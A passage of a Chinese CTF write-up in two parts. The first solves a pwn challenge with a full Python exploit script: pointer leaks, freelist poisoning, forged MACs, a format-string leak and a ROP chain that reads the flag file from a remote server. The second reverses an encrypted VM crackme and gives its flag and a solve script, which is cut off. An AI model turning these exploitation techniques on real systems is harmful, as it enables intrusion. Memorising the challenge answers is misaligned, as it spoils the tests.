解出 `flag_fd = 9` ， `read = 0x7f295d364920` ， `vault_pie = 0x7f295d47b000` ， `libc = 0x7f295d250000` 。两个基址都按页对齐，fd 大于 3，和 vault 打开 flag 时的检查一致。

### 3.6 在 0xA7 里溢出并 ORW

`0xA7` 把长度零扩展后做两次检查： `dil <= 0x80` ，并且 `di <= 0x400` 。长度 `0x200` 的低字节是 `0x00` ，两个条件都过。随后把这么多字节读到 `rbp - 0x120` 。

帧布局：

```
push rbp
mov  rbp, rsp
push rbx
sub  rsp, 0x118
canary -> [rbp - 0x18]
buffer -> rbp - 0x120
```

相对缓冲区的偏移是：

```
0x108  canary
0x118  保存的 rbx
0x120  保存的 rbp
0x128  返回地址
```

canary 比对通过后执行 `mov rbx, [rbp-8]; leave; ret` 。rbx 和保存的 rbp 可以写成 0。

读入 flag 的缓冲区选 `vault_pie + 0x4100` 。`.bss` 从 `0x4020` 起，大小 `0x428` ，结束于 `0x4448` ；GNU_RELRO 只覆盖到 `0x4000` 。 `0x4100` 可写，也不碰到 `0x4430` 的 flag fd。

ROP 使用 libc 中的：

```
pop rdi; ret          libc + 0x2a3e5
pop rsi; ret          libc + 0x2be51
pop rdx; pop rbx; ret libc + 0x90469
read                  libc + 0x114920
write                 libc + 0x1149c0
```

`pop rdx` 后面多弹出的 rbx 同时把进入 `read` / `write` 时的栈对齐保持在 `rsp ≡ 8 (mod 16)` 。链是：

```
read(flag_fd, pie + 0x4100, 0x80)
write(1,      pie + 0x4100, 0x80)
```

fd 1 经过 vault、broker、probe 三级转发回到客户端。 `0x80` 比 flag 长，尾部是 BSS 里的 0。

## 4\. 完整解题脚本

脚本只使用 Python 标准库。把下面的代码保存为 `exploit.py` 后，对远程执行 `python3 exploit.py 1.14.76.59 17371` 。不带参数时连接 `127.0.0.1:9999` 。

```kotlin
#!/usr/bin/env python3
import socket
import sys
import time

HOST = "127.0.0.1"
PORT = 9999
if len(sys.argv) >= 3:
    HOST = sys.argv[1]
    PORT = int(sys.argv[2])
MASK = (1 << 64) - 1

# glibc 2.35-0ubuntu3.15，偏移相对 libc 加载基址
POP_RDI = 0x2A3E5
POP_RSI = 0x2BE51
POP_RDX_RBX = 0x90469
READ_OFF = 0x114920
WRITE_OFF = 0x1149C0

def rol(x, n):
    n %= 64
    return ((x << n) | (x >> (64 - n))) & MASK

def ror(x, n):
    n %= 64
    return ((x >> n) | (x << (64 - n))) & MASK

def u64(b):
    return int.from_bytes(b, "little")

def p64(x):
    return (x & MASK).to_bytes(8, "little")

def p16(x):
    return (x & 0xFFFF).to_bytes(2, "little")

def mix(x):
    """broker ROUTE 的 splitmix64。"""
    x &= MASK
    x ^= x >> 30
    x = (x * 0xBF58476D1CE4E5B9) & MASK
    x ^= x >> 27
    x = (x * 0x94D049BB133111EB) & MASK
    x ^= x >> 31
    return x

CONST = 0x6F27C4B19A5E38D2

class Conn:
    def __init__(self):
        self.s = socket.socket()
        self.s.connect((HOST, PORT))
        self.s.settimeout(2)
        print("BANNER", self._recv(timeout=2))

    def _recv(self, n=4096, timeout=0.4):
        self.s.settimeout(timeout)
        try:
            return self.s.recv(n)
        except socket.timeout:
            return b""

    def sql(self, q):
        self.s.sendall(q.encode() + b"\n")
        data = b""
        deadline = time.time() + 3
        while time.time() < deadline:
            c = self._recv()
            if not c:
                if data:
                    break
                continue
            data += c
            if b"\nOK\n" in data or b"ERR" in data:
                break
        if b"ERR" in data:
            raise SystemExit("sql failed " + data.decode("latin1", "replace"))
        return data

    def recvn(self, n, timeout=2):
        out = b""
        deadline = time.time() + timeout
        while len(out) < n and time.time() < deadline:
            c = self._recv(n - len(out), timeout=0.4)
            if c:
                out += c
        return out

    def recv_some(self, timeout=1.5):
        out = b""
        deadline = time.time() + timeout
        while time.time() < deadline:
            c = self._recv(timeout=0.3)
            if not c:
                if out:
                    break
                continue
            out += c
        return out

def parse_row(data):
    line = data.split(b"\n", 1)[0]
    return bytes.fromhex(line.split(b" ", 1)[1].decode())

def main():
    c = Conn()
    z = b"\x00" * 0x60
    # 先让过滤器记下 seal 指针，再在同一条语句里放两个仍活着的指针参数
    c.sql("SELECT * FROM ledger WHERE seal=ledger_seed();")
    c.sql("SELECT ledger_bind(ledger_seed(), ledger_seed());")
    c.sql(f"SELECT ledger_make(0, 1, x'{z.hex()}');")
    c.sql(f"SELECT ledger_make(1, 1, x'{z.hex()}');")
    c.sql("SELECT ledger_mark(1);")
    blob = parse_row(c.sql("SELECT ledger_audit();"))
    func, obj, mac, _ = [u64(blob[i:i + 8]) for i in range(0, 32, 8)]
    pie = func - 0x1260
    cookie = func ^ mac ^ ror(obj, 12)
    print(f"probe pie={pie:#x} cookie={cookie:#x} obj={obj:#x}")

    # 两个对象都 drop 后，freelist 头是 obj1。touch 改掉它的 next，
    # 下一次 make 弹出 obj1，再下一次 make 才弹出 BSS 上的 0x5110。
    target = pie + 0x5110
    c.sql("SELECT ledger_drop(0);")
    c.sql("SELECT ledger_drop(1);")
    c.sql(f"SELECT ledger_touch(x'{p64(target ^ (obj >> 12)).hex()}');")
    c.sql(f"SELECT ledger_make(2, 1, x'{z.hex()}');")
    proxy = pie + 0x1C10
    fmac = rol(proxy ^ cookie ^ 0x91E10DA5C79B43F2, 0x17)
    payload = p64(proxy) + p64(fmac) + b"\x00" * (0x60 - 16)
    c.sql(f"SELECT ledger_make(3, 2, x'{payload.hex()}');")
    c.s.sendall(b"SELECT ledger_fire();\n")
    hello = c.recvn(8)
    print("broker", hello)
    if hello != b"LBR3\x03\x00\x00\x00":
        raise SystemExit("bad broker hello")

    def cmd(op, slot, body=b"", wait=True):
        c.s.sendall(bytes([op, slot]) + p16(len(body)) + body)
        if not wait:
            return b"", b""
        hdr = c.recvn(4)
        ln = int.from_bytes(hdr[2:4], "little")
        data = c.recvn(ln) if ln else b""
        print(f"  {op:#x}/{slot} status={hdr[0]} len={ln}")
        return hdr, data

    cmd(0x31, 0)  # WINDOW
    cmd(0x59, 0)  # ROUTE，紧挨在 WINDOW 后面
    _, data = cmd(0x6A, 0, p16(0x100) + p16(0x110))
    magic = bytes.fromhex("0000334554554f52")  # qword 0x524f555445330000
    idx = data.find(magic)
    print("route at", idx, "leak", len(data))
    if idx != 0xD0:
        raise SystemExit("unexpected layout")
    route = data[idx:idx + 0x40]
    field8 = u64(route[0x08:0x10])
    field10 = u64(route[0x10:0x18])
    field18 = u64(route[0x18:0x20])
    rself = u64(route[0x20:0x28])
    rmac = u64(route[0x28:0x30])
    rfunc = u64(route[0x30:0x38])
    bpie = rfunc - 0x1760
    bcookie = rmac ^ rfunc ^ ror(rself, 0x11)
    if mix(field8 ^ field10 ^ bcookie ^ CONST) != field18:
        raise SystemExit("hash mismatch")
    print(f"broker pie={bpie:#x} cookie={bcookie:#x} self={rself:#x}")

    want = bpie + 0x2120
    new10 = rol(want ^ rself ^ bcookie, 0x1D)
    new18 = mix(field8 ^ new10 ^ bcookie ^ CONST)
    forged = bytearray(data[:0x100])
    forged[0xE0:0xE8] = p64(new10)
    forged[0xE8:0xF0] = p64(new18)
    cmd(0x6B, 0, p16(0x100) + p16(0x100) + bytes(forged))
    cmd(0x7E, 0, b"", wait=False)
    vhello = c.recvn(8, timeout=2)
    print("vault", vhello)
    if not vhello.startswith(b"LVL3"):
        raise SystemExit("no vault")

    fmt = b"%1$p.%2$p.%3$p.%4$p.%5$p"
    c.s.sendall(bytes([0x91, 0]) + p16(len(fmt)) + fmt)
    leak = c.recv_some(2)
    print("fmt", leak)
    nums = []
    for part in leak.split(b"\x00", 1)[0].decode().split("."):
        part = part.strip()
        nums.append(0 if part in ("", "(nil)") else int(part, 16))
    a1, a2, a3, a4, a5 = nums
    vcookie = a5 ^ 0x58DF37A91C62E40B
    flag_fd = (a3 ^ ror(vcookie, 9)) & MASK
    canary = a4 ^ rol(vcookie, 0x1F)
    readp = a2 ^ rol(vcookie, 0xD)
    vpie = (a1 ^ vcookie) - 0x1AC0
    libc = readp - READ_OFF
    print(f"fd={flag_fd:#x} canary={canary:#x} read={readp:#x}")
    print(f"vault pie={vpie:#x} libc={libc:#x}")
    if vpie & 0xFFF or libc & 0xFFF or not (3 < flag_fd <= 0x100):
        raise SystemExit("bad leak")

    # read(flag_fd, bss, 0x80); write(1, bss, 0x80)
    buf = vpie + 0x4100
    pop_rdi = libc + POP_RDI
    pop_rsi = libc + POP_RSI
    pop_rdx_rbx = libc + POP_RDX_RBX
    chain = [
        pop_rdi, flag_fd,
        pop_rsi, buf,
        pop_rdx_rbx, 0x80, 0,
        libc + READ_OFF,
        pop_rdi, 1,
        pop_rsi, buf,
        pop_rdx_rbx, 0x80, 0,
        libc + WRITE_OFF,
    ]
    rop = b"".join(p64(x) for x in chain)
    body = b"A" * 0x108 + p64(canary) + b"B" * 8 + p64(0) + p64(0) + rop
    body = body.ljust(0x200, b"C")
    assert len(body) == 0x200
    c.s.sendall(bytes([0xA7, 0]) + p16(0x200) + body)
    out = b""
    c.s.settimeout(1.2)
    deadline = time.time() + 4
    while time.time() < deadline:
        try:
            chunk = c.s.recv(4096)
        except socket.timeout:
            if out:
                break
            continue
        if not chunk:
            break
        out += chunk
    print("OUT", out)

if __name__ == "__main__":
    main()
```

**执行命令：**

```
python3 exploit.py 1.14.76.59 17371
```

**实际输出：**

```rust
BANNER b'justledger\n'
probe pie=0x7f70ecc6b000 cookie=0x60fd8f0074f55db1 obj=0x5555570d3710
broker b'LBR3\x03\x00\x00\x00'
  0x31/0 status=0 len=0
  0x59/0 status=0 len=0
  0x6a/0 status=0 len=272
route at 208 leak 272
broker pie=0x7f5d30a25000 cookie=0xc9e83d0952e9a5a5 self=0x55555751d580
  0x6b/0 status=0 len=0
vault b'LVL3\x01\x00\x00\x00'
fmt b'0xf3da71131b297033.0x41c737e48a68375b.0x79f9ed071d233754.0x2ff09f0d15f7cc1d.0xab0539935a0c5ef8\n'
fd=0x9 canary=0xcc7c274ec1acb00 read=0x7f295d364920
vault pie=0x7f295d47b000 libc=0x7f295d250000
OUT b'DASCTF{92875846957195623110612840554366}\n\x00...'
```

`route at 208` 说明 WINDOW 和 ROUTE 仍然相邻。 `vault` 的 hello 说明伪造调用进了 vault 代理。 `libc` 页对齐，且 `read - libc = 0x114920` 。 `OUT` 的前缀就是 flag 文件内容，后面的 `\x00` 是多读出的 BSS。

## VVMM

> 核心思路：解密 VMC2 容器，丢掉魔数为 `0xbadf00d` 的假入口，再按解释器里的逆变换，从 31 个 `CMPI8` 常量倒推出输入。

## 1\. 题目说明

题目只给一个提示和 `VVMM.exe` ：

> 一层难后一重关，恢复VM找到藏在其中最美丽的姑娘

附件是 47616 字节的 PE32+ x86-64 控制台程序，SHA-256 为 `cc222acda86a869ae53d4fe1c0144a54190f756e4ecd170bedbb7deac5ae2c16` 。编译器痕迹是 `GCC: (Rev5, Built by MSYS2 project) 16.1.0` 。程序没有联网，校验完全在本地完成。

直接运行能看到它把自己叫作 VMVault，并提供这些子命令：

```
VVMM.exe --layout
VVMM.exe --disasm [count]
VVMM.exe --check <candidate>
VVMM.exe --run <candidate>
```

`--layout` 的实际输出是：

```yaml
vm container  : VMC2 / multi-entry encrypted bytecode
vm blob bytes : 20016
entries       : 2
program bytes : 19696
instructions  : 2462
registers     : 8 x u32
memory        : 128 bytes
rounds        : 7 global rounds
```

`--check test` 打印 `rejected` 。 `--run hello` 给出：

```
[vm] REJECT
[vm] steps=3 pc=0x4ce8 acc=0x00 zero=0 halt=0xf1
```

错误输入只走了 3 步就停在 `0x4ce8` 。后面会看到，那里是长度检查失败后的 `FAIL` 。

## 2\. 解题思路

字节码不是明文。`.rdata` 里有一块 20016 字节的 `VMC2` 容器，装了两个加密入口。装载器 `0x140002940` 逐个解密，只收下第一条同时满足“校验和正确、首指令是 `MAGIC` 、立即数是 `0xc0def00d` ”的程序。入口 0 的魔数是 `0x0badf00d` ，解密后直接 `FAIL` ，被跳过。入口 1 才是 2462 条指令的真程序。

真程序把输入限制为 31 字节。每个字节先做一次由下标决定的 `XOR / ADD / ROL / STAGE` ，再做 7 轮原地混合；邻居下标是 `(i+1) mod 31` 和 `(i+7) mod 31` 。最后 31 条 `CMPI8` 比较内存。 `STAGE` 对单个字节不是线性的，但值域只有 256，可以枚举逆像。

二进制自己在 `0x140003180` 里写了这条逆运算：从最终比较常量出发，按 30 到 0 拆掉 7 轮混合，再拆掉每字节的前处理。照它实现一遍，就得到候选串。把候选串重新送进同一段字节码，解释器停在 `OK` ，步数和原程序的 `--run` 一致。

## 3\. 解题过程

### 3.1 定位容器并解密两个入口

`VMC2` 在文件偏移 `0x4760` ，RVA `0x6f60` 。旁边的字符串 `"VMC2 / multi-entry..."` 不是容器。容器头和每个入口的布局是：

```rust
容器 +0  "VMC2"
     +4  u8   入口个数
     +8  入口数组

入口 +0  u32  key
     +4  u8   mix
     +6  u16  payload_len
     +8  u32  checksum
     +12 payload[payload_len]
```

下一个入口紧挨着上一个 payload。两个入口的长度分别是 288 和 19696，加上各自 12 字节入口头和 8 字节容器头，正好是 20016。

`0x140002940` 的解密可以收成三步。记 `state = mix ^ key` ， `running` 初值是 `mix + (key >> 11)` ， `stream` 从 0 开始：

```php
stream 每次增加 0x045D9F3B
mixed  = stream_old ^ state ^ 0x9E3779B9
mixed  = mixed ^ (mixed >> 16)
mixed  = mixed * 0x7FEB352D
mixed  = mixed ^ (mixed >> 15)
mixed  = mixed * 0x846CA68B
mixed  = mixed ^ (mixed >> 16)
ks     = mixed 的第 (index & 3) 个字节
plain  = cipher ^ (running 的低字节) ^ ks
running = running - 0x59
```

解密后再做一轮 FNV 风格摘要：初值 `state ^ 0x811C9DC5` ，对每个明文字节执行 `h = (h ^ b) * 0x01000193` ，再 `h ^= h >> 13` 。 `payload_len ^ h` 必须等于入口里的 checksum。通过之后还要检查明文首字节是 `0x01` ，并且偏移 4 的小端立即数是 `0xC0DEF00D` 。不满足就试下一个入口。

实际解出来的两个入口：

```
entry off=8     bytes=288    checksum=ok magic=0badf00d skip
entry off=308   bytes=19696  checksum=ok magic=c0def00d live
```

入口 0 的开头和结尾是：

```
0000  MAGIC  imm=0x0badf00d
0008  MOVI   r0, 0xdead0000
0010  XORI   r0, 0xa5a5a5a5
...
0118  FAIL
```

它校验和是对的，但魔数不是 `0xC0DEF00D` ，装载器不会执行它。这就是提示里的第一层：容器加密外面还有一个看起来像程序、实际直接失败的入口。

### 3.2 还原指令编码

反汇编器在 `0x140002db0` 。每条指令 8 字节：

```
+0 opcode
+1 目标寄存器
+2 源寄存器
+3 附加字节
+4 u32 小端立即数
```

打印寄存器时会再 `& 7` ，所以可见寄存器只有 `r0` 到 `r7` 。和本题有关的 opcode 是：

| opcode | 助记符 | 行为  |
| --- | --- | --- |
| `0x01` | `MAGIC` | 装载器已经检查过，解释器从下一条开始 |
| `0x10` | `LEN` | 零标志 = 立即数是否等于输入长度 |
| `0x11` | `LDB` | `reg[dst] = input[imm]`<br><br>，越界则为 0 |
| `0x12` | `LDM` | `reg[dst] = mem[imm & 0x7f]` |
| `0x13` | `STM` | `mem[imm & 0x7f] = reg[dst]`<br><br>的低字节 |
| `0x20`<br><br>– `0x23` | `MOVI`<br><br>/ `XORI` / `ADDI` / `MULI` | 对整个 `u32` 寄存器 |
| `0x24`<br><br>/ `0x25` | `ROLI`<br><br>/ `RORI` | 只旋转低 8 位，旋转量取立即数低 5 位 |
| `0x26`<br><br>/ `0x27` | `XORR`<br><br>/ `ADDR` | `reg[dst]`<br><br>与 `reg[src]` 运算 |
| `0x30` | `STAGE` | reg\[dst\] = stage(imm, reg 低字节)<br><br>，高位清零 |
| `0x40` | `CMPI8` | 零标志 = 寄存器低字节是否等于立即数低字节 |
| `0x50` | `JNZ` | 零标志为 0 时， `pc = pc + imm*8 + 8` |
| `0xF0`<br><br>/ `0xF1` | `OK`<br><br>/ `FAIL` | 接受或拒绝 |

`JNZ` 的目标公式可以用第一条跳转核对。它位于 `pc = 0x10` ，立即数 `0x99A` ：

```
0x10 + 0x99A * 8 + 8 = 0x4CE8
```

这正是 `--disasm` 打印的 `target=0x4ce8` ，也是错误输入停住的地址。

解释器 `0x140003480` 的程序计数器从 8 开始，不重复执行 `MAGIC` 。每取一条指令步数加一，上限 `0x4E20` 。因此正确路径的步数是从 `0x8` 到 `0x4CE0` 的指令数，共 2460，而不是全部 2462。

### 3.3 真程序在比什么

入口 1 的开头：

```yaml
0000  MAGIC  imm=0xc0def00d
0008  LEN    imm=0x1f
0010  JNZ    imm=0x99a     target=0x4ce8
0018  LDB    index=0
0020  XORI   imm=0xfb
0028  ADDI   imm=0x6a
0030  ROLI   imm=0x04
0038  STAGE  imm=0
0040  STM    index=0
0048  MOVI   r1, 0x13579bdf
0050  MULI   r1, 0x045d9f3b
0058  XORI   r1, 0xc001d00d
```

`LEN 0x1F` 之后，长度不是 31 就跳到 `FAIL` 。这和 `--run hello` 只走 3 步相符：跳过 `MAGIC` 后执行 `LEN` 、 `JNZ` 、 `FAIL` 。

31 个输入字节各自重复同一骨架，只是立即数不同。 `r1` 上的 `MOVI / MULI / XORI` 不写内存，也不参与最后的比较，是干扰指令。对下标 `i` ，真正留下的是：

```
t = input[i] XOR k(i)
t = t + add(i)
t = rol8(t, rot(i))
mem[i] = stage(i, t)
```

前 31 次变换之后是 7 轮混合。第一轮开头：

```yaml
08d0  LDM   r0, index=0
08d8  LDM   r1, index=1
08e0  ADDR  r0, r1
08e8  LDM   r1, index=7
08f0  XORR  r0, r1
08f8  ROLI  r0, 2
0900  STAGE imm=0x40
0908  ADDI  imm=0x5a
0910  STM   index=0
0918  NOP
0920  MOVI  r2, 0x9e3779b9
0928  RORI  r2, 0
```

`NOP` 、 `MOVI r2` 、 `RORI r2` 同样不改变 `r0` 和内存。有效操作是：

```
v = mem[i] + mem[(i+1) mod 31]
v = v XOR mem[(i+7) mod 31]
v = rol8(v, rot)
v = stage(stage_id, v)
v = v + addi
mem[i] = v
```

一轮里 `i` 从 0 扫到 30，并且就地写回。所以处理 `i` 时，比 `i` 小的下标已经是本轮新值，比 `i` 大的下标还是本轮旧值。 `(i+7) mod 31` 发生回绕时，读到的也是已经更新过的格子。

opcode 计数和这个结构一致： `STAGE` 共 248 次，其中 31 次是逐字节前处理，剩下 217 次正好是 `7 * 31` 。 `ADDR` 和 `XORR` 也都是 217 次。

程序末尾对 `mem[0]` 到 `mem[30]` 各做一次 `LDM` + `CMPI8` ，不对就 `JNZ` 到 `0x4CE8` 。全部通过才执行 `0x4CE0` 的 `OK` 。这 31 个期望字节是：

```
fd bd 28 ce b1 91 f6 39 d7 e5 31 8e 96 d7 02 15
f0 9b 38 bd e7 cd c7 ab 89 a3 3c 29 b7 18 2a
```

`--disasm` 尾部的 `c7 ab 89 a3 3c 29 b7 18 2a` 就是这里的最后 9 个。

### 3.4 实现 STAGE，并核对它就是可逆的字节变换

`STAGE` 的实现在 `0x140002d10` ，先调用 `0x140002ce0` 。混合函数固定把 `0xA5` 加进 `0x6D2B79F5` ，再与 `stage * 0x9E3779B9` 异或，然后做两轮移位乘法：

```
h = h ^ (h >> 16);  h = h * 0x85EBCA6B
h = h ^ (h >> 13);  h = h * 0xC2B2AE35
h = h ^ (h >> 16)
```

记 `low = h & 0xFF` 。 `STAGE` 随后只保留低 8 位能观察到的部分：

```
stage(s, b) = rol8(b XOR low, s*3+1) + s*0x31 + 0x42
stage(s, b) = stage(s, b) XOR (low >> 1)
```

加法、旋转和异或都在单字节上。同一个 `s` 下不同 `b` 可能撞车，所以逆运算不能写闭式除法。 `0x140003180` 的做法是对 `0..255` 从小到大试，取第一个命中的原像；一个都没有就当 0。下面沿用这个规则。最终把候选代回解释器，确认选中的原像确实能走到 `OK` 。

### 3.5 从比较常量倒着拆 7 轮和逐字节变换

`0x140003180` 先扫描明文指令，收集每一对 `LDM r0` + `CMPI8 r0` 的立即数，得到上一节那 31 个字节。然后做 7 轮逆混合。轮常量的递推是：

```toml
rot_start  = 0xAA, 0xA7, 0xA4, 0xA1, 0x9E, 0x9B, 0x98
addc       = 0x74, 0xA7, 0xDA, 0x0D, 0x40, 0x73, 0xA6
stage_base = 0xFA, 0xDB, 0xBC, 0x9D, 0x7E, 0x5F, 0x40
```

也就是 `rot_start` 每轮减 3， `addc` 每轮加 `0x33` ，内部的 `r13` 从 `0xBA` 起每轮减 `0x1F` ， `stage_base = r13 + 0x40` 。减到 `0x98 - 3 == 0x95` 时停止，一共 7 轮，和 `--layout` 的 `7 global rounds` 相同。逆序的第 7 轮 `stage_base = 0x40` ，对应正向的第一轮混合；逆序的第 1 轮对应正向的最后一轮。

每一轮内部从 `i = 30` 走到 `i = 0` ：

```
produced = addc + mem[i] - 17*i          (mod 256)
pre      = invert_stage(stage_base + i, produced)
pre      = ror8(pre, rot_start - 5*(30-i))
pre      = pre XOR mem[(i+7) mod 31]
mem[i]   = pre - mem[(i+1) mod 31]       (mod 256)
```

高下标先恢复。拆 `i` 时，更大的下标已经回到本轮输入，更小的下标仍是本轮输出。这和正向从 0 扫到 30 的读数时机相反而相等，所以就地逆是对的。

这组式子和正向立即数对得上。逆序最后一轮里 `addc = 0xA6` 、 `stage_base = 0x40` 、 `rot_start = 0x98` 。正向加法立即数是 `(17*i - addc) mod 256` ，旋转量是 `(rot_start - 5*(30-i)) mod 256` 再按 8 位旋转的周期取。 `i = 0` 时加法是 `0x5A` ，旋转是 2， `STAGE` 编号是 `0x40` ，与 `08f8` – `0908` 三条指令一致。

7 轮拆完后，内存回到逐字节 `STAGE` 的输出。再对 `i = 0..30` 拆前处理：

```
esi = 0x96, 0x6F, 0x48, ...     每字节减 0x27
key = 0xA7, 0xE0, 0x19, ...     每字节加 0x39
pre = invert_stage(i, mem[i])
t   = ror8(pre, i*5+4)
input[i] = t + esi - 3*i*i
input[i] = input[i] XOR key XOR (11*i) XOR 0x5C
```

运算都取低 8 位。把它正过来就是：

```
k   = key(i) XOR (11*i) XOR 0x5C
add = 3*i*i - esi(i)
pre = rol8(input[i] XOR k + add, i*5+4)
mem[i] = stage(i, pre)
```

`i = 0` 时 `k = 0xA7 XOR 0x5C = 0xFB` ， `add = -0x96 = 0x6A` ，旋转量 `4` 。这和程序开头的 `XORI 0xFB` 、 `ADDI 0x6A` 、 `ROLI 4` 、 `STAGE 0` 一致，说明逆变换没有把干扰指令算进去。

倒推结果是 31 字节：

```
flag{J1nxI_i5_4_6eautiful_g1rl}
```

按 leet 读就是 “JinxI is a beautiful girl”： `1→i` 、 `5→s` 、 `4→a` 、 `6→b` 。这对应题面里的“最美丽的姑娘”。

## 4\. 完整解题脚本

把下面的代码保存为 `solve.py` ，和 `VVMM.exe` 放在同一目录。脚本只依赖 Python 标准库：它自己找 `VMC2` ，解密入口，倒推 31 字节，再用同一套 opcode 语义执行真程序。

```python
#!/usr/bin/env python3
"""Recover the VVMM candidate from the encrypted VMC2 bytecode and re-execute it."""

import struct
import sys
from pathlib import Path


def u32(x):
    return x & 0xFFFFFFFF


def rol8(value, count):
    count = (count & 31) % 8
    value &= 0xFF
    if count == 0:
        return value
    return ((value << count) | (value >> (8 - count))) & 0xFF


def ror8(value, count):
    count = (count & 31) % 8
    value &= 0xFF
    if count == 0:
        return value
    return ((value >> count) | (value << (8 - count))) & 0xFF


def mix_hash(stage):
    """0x140002ce0: the 32-bit mixer used by STAGE. edx enters as 0xA5."""
    ecx = u32(stage * 0x9E3779B9)
    edx = u32(0xA5 + 0x6D2B79F5)
    edx ^= ecx
    eax = u32(edx ^ (edx >> 16))
    eax = u32(eax * 0x85EBCA6B)
    edx = u32(eax ^ (eax >> 13))
    edx = u32(edx * 0xC2B2AE35)
    return u32(edx ^ (edx >> 16))


def stage_byte(stage, byte):
    """0x140002d10. Only the low 8 bits of the result are observable."""
    mixed = mix_hash(stage)
    low = mixed & 0xFF
    rotated = rol8(byte ^ low, stage * 3 + 1)
    return ((rotated + stage * 0x31 + 0x42) ^ (low >> 1)) & 0xFF


def invert_stage(stage, output):
    for guess in range(256):
        if stage_byte(stage, guess) == (output & 0xFF):
            return guess
    return 0


def decrypt_entry(blob, offset):
    """Decrypt one VMC2 entry. Returns (plaintext, checksum_ok, payload_len)."""
    payload_len = struct.unpack_from("<H", blob, offset + 6)[0]
    key = struct.unpack_from("<I", blob, offset)[0]
    mix = blob[offset + 4]
    ciphertext = blob[offset + 12 : offset + 12 + payload_len]
    state = u32(mix ^ key)
    running = u32(mix + (key >> 11))
    stream = 0
    plain = bytearray(payload_len)
    for index, cipher in enumerate(ciphertext):
        mixed = stream
        stream = u32(stream + 0x045D9F3B)
        mixed = u32(mixed ^ state ^ 0x9E3779B9)
        mixed = u32(mixed ^ (mixed >> 16))
        mixed = u32(mixed * 0x7FEB352D)
        mixed = u32(mixed ^ (mixed >> 15))
        mixed = u32(mixed * 0x846CA68B)
        keystream = u32(mixed ^ (mixed >> 16)) >> ((index & 3) * 8)
        plain[index] = cipher ^ (running & 0xFF) ^ (keystream & 0xFF)
        running = u32(running - 0x59)

    digest = u32(state ^ 0x811C9DC5)
    for byte in plain:
        digest = u32(digest ^ byte)
        digest = u32(digest * 0x01000193)
        digest = u32(digest ^ (digest >> 13))
    expect = struct.unpack_from("<I", blob, offset + 8)[0]
    return bytes(plain), u32(payload_len ^ digest) == expect, payload_len


def find_blob(raw):
    """Walk every VMC2 header until both entries decrypt and one is live."""
    start = 0
    while True:
        found = raw.find(b"VMC2", start)
        if found < 0:
            break
        count = raw[found + 4]
        offset = 8
        plausible = 1 <= count <= 8
        for _ in range(count):
            if found + offset + 12 > len(raw):
                plausible = False
                break
            payload_len = struct.unpack_from("<H", raw, found + offset + 6)[0]
            if not 8 <= payload_len <= 0x8000 or found + offset + 12 + payload_len > len(raw):
                plausible = False
                break
            offset += 12 + payload_len
        if plausible:
            blob = raw[found : found + offset]
            if load_program(blob) is not None:
                return blob
        start = found + 1
    raise SystemExit("VMC2 container not found")


def load_program(blob):
    if len(blob) < 8 or blob[:4] != b"VMC2":
        return None
    offset = 8
    selected = None
    summaries = []
    for _ in range(blob[4]):
        if offset + 12 > len(blob):
            return None
        plain, ok, payload_len = decrypt_entry(blob, offset)
        if offset + 12 + payload_len > len(blob):
            return None
        magic = struct.unpack_from("<I", plain, 4)[0] if len(plain) >= 8 else 0
        live = ok and plain[:1] == b"\x01" and magic == 0xC0DEF00D
        summaries.append((offset, payload_len, ok, magic, live))
        if live and selected is None:
            selected = plain
        offset += 12 + payload_len
    if offset != len(blob) or selected is None:
        return None
    return selected, summaries


def expected_memory(program):
    """Last LDM r0 / CMPI8 r0 pair for each memory index is the final oracle."""
    expected = [None] * 31
    for pc in range(0, len(program) - 8, 8):
        if program[pc] != 0x12 or program[pc + 8] != 0x40:
            continue
        index = struct.unpack_from("<I", program, pc + 4)[0]
        if index > 30 or ((program[pc + 1] | program[pc + 9]) & 7) != 0:
            continue
        expected[index] = struct.unpack_from("<I", program, pc + 12)[0] & 0xFF
    if any(value is None for value in expected):
        raise SystemExit("bytecode is missing a final compare")
    return expected


def recover(expected):
    """
    Invert the seven in-place rounds from high index to low, then invert the
    per-byte XOR/ADD/ROL/STAGE prologue. Constants come from 0x140003180.
    """
    state = list(expected)
    for round_index in range(7):
        rot_start = (0xAA - 3 * round_index) & 0xFF
        addend = (0x74 + 0x33 * round_index) & 0xFF
        stage_base = u32((0xBA - 0x1F * round_index) + 0x40)
        for index in range(30, -1, -1):
            produced = (addend + state[index] - 17 * index) & 0xFF
            found = invert_stage(stage_base + index, produced)
            rotation = (rot_start - 5 * (30 - index)) & 0xFF
            value = ror8(found, rotation)
            value ^= state[(index + 7) % 31]
            value = (value - state[(index + 1) % 31]) & 0xFF
            state[index] = value

    output = bytearray(31)
    running_add = 0x96
    running_key = 0xA7
    for index in range(31):
        found = invert_stage(index, state[index])
        value = ror8(found, index * 5 + 4)
        value = (value + running_add - 3 * index * index) & 0xFF
        value ^= running_key ^ ((11 * index) & 0xFF) ^ 0x5C
        output[index] = value & 0xFF
        running_add = (running_add - 0x27) & 0xFF
        running_key = (running_key + 0x39) & 0xFF
    return bytes(output)


def execute(program, candidate):
    """Interpreter starts at offset 8; the loader already consumed MAGIC."""
    regs = [0] * 8
    memory = bytearray(128)
    zero = 0
    pc = 8
    steps = 0
    limit = len(program)
    while pc + 8 <= limit and steps < 0x4E20:
        opcode = program[pc]
        dest = program[pc + 1] & 7
        src = program[pc + 2] & 7
        imm = struct.unpack_from("<I", program, pc + 4)[0]
        signed = struct.unpack_from("<i", program, pc + 4)[0]
        steps += 1
        if opcode in (0x00, 0x01):
            pc += 8
        elif opcode == 0x10:
            zero = int(imm == len(candidate))
            pc += 8
        elif opcode == 0x11:
            regs[dest] = candidate[imm] if imm < len(candidate) else 0
            pc += 8
        elif opcode == 0x12:
            regs[dest] = memory[imm & 0x7F]
            pc += 8
        elif opcode == 0x13:
            memory[imm & 0x7F] = regs[dest] & 0xFF
            pc += 8
        elif opcode == 0x20:
            regs[dest] = imm
            pc += 8
        elif opcode == 0x21:
            regs[dest] = u32(regs[dest] ^ imm)
            pc += 8
        elif opcode == 0x22:
            regs[dest] = u32(regs[dest] + imm)
            pc += 8
        elif opcode == 0x23:
            regs[dest] = u32(imm * regs[dest])
            pc += 8
        elif opcode == 0x24:
            regs[dest] = (regs[dest] & 0xFFFFFF00) | rol8(regs[dest], imm)
            pc += 8
        elif opcode == 0x25:
            regs[dest] = (regs[dest] & 0xFFFFFF00) | ror8(regs[dest], imm)
            pc += 8
        elif opcode == 0x26:
            regs[dest] = u32(regs[dest] ^ regs[src])
            pc += 8
        elif opcode == 0x27:
            regs[dest] = u32(regs[dest] + regs[src])
            pc += 8
        elif opcode == 0x30:
            regs[dest] = stage_byte(imm, regs[dest] & 0xFF)
            pc += 8
